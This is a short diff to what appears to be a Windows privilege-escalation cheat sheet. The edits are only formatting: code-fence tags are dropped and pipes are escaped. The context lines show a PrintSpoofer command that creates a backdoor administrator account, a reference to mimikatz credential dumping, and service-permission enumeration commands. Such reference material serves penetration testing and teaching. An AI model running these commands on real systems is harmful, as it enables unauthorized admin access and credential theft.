@@ -283,7 +283,7 @@ whoami /priv
 ```
 
 Example with PrintSpoofer:
-```cmd
+```
 PrintSpoofer.exe -i -c "cmd /c net user hacker Password123! /add && net localgroup Administrators hacker /add"
 ```
 
@@ -439,7 +439,7 @@ sekurlsa::logonpasswords full
 ### Services & Applications
 - [ ] Running processes (tasklist /svc)
 - [ ] Service permissions (accesschk.exe -uwcqv "Authenticated Users" *)
-- [ ] Unquoted service paths (wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """")
+- [ ] Unquoted service paths (wmic service get name,pathname,startmode \| findstr /i "auto" \| findstr /i /v "C:\Windows\\" \| findstr /i /v """")
 - [ ] Service binary permissions (icacls "C:\path\to\service\executable.exe")
 - [ ] Installed applications (wmic product get name,version)
 
@@ -497,7 +497,7 @@ sekurlsa::logonpasswords full
 
 ## Command Line Cheat Sheet
 
-```cmd
+```
 REM Current username
 whoami
 
